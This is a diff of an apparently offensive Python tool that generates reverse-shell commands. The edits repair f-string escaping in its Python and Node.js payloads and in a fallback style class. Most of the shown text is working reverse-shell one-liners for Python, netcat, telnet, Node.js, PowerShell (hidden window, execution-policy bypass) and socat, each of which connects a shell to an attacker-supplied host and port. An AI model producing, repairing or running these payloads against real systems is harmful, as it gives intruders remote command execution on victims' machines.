@@ -11,7 +11,7 @@ try:
     init(autoreset=True)
 except:
     class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
-    Style=Fore
+    class Style: RESET_ALL='';BRIGHT='';DIM='';NORMAL=''
 
 R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
 M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL
@@ -137,7 +137,7 @@ s.connect(('{lhost}',{lport}))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn('/bin/sh')
 " ''',
-        f'python -c "exec(\\\"import socket,subprocess;s=socket.socket();s.connect((\\'{lhost}\\',{lport}));subprocess.call([\\'/bin/sh\\',\\'-i\\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\\\")"',
+        f"python -c \"exec(\\\"import socket,subprocess;s=socket.socket();s.connect((\\'{lhost}\\',{lport}));subprocess.call([\\'/bin/sh\\',\\'-i\\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\\\")\"",
         f'''python -c '
 import socket,subprocess
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -409,7 +409,7 @@ def one_liner_generator():
         'Netcat': f"nc -e /bin/sh {lhost} {lport}",
         'Netcat (no -e)': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
         'Telnet': f"rm -f /tmp/p; mknod /tmp/p p && telnet {lhost} {lport} 0/tmp/p",
-        'Node.js': f"node -e 'require(\"net\").connect({lport},\"{lhost}\",function(){require(\"child_process\").exec(\"/bin/sh -i\",function(e,o){this.write(o)})})'",
+        'Node.js': f"node -e 'require(\"net\").connect({lport},\"{lhost}\",function(){{require(\"child_process\").exec(\"/bin/sh -i\",function(e,o){{this.write(o)}})}})'",
         'PowerShell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"',
         'Socat': f"socat exec:'/bin/sh' tcp-connect:{lhost}:{lport}",
     }
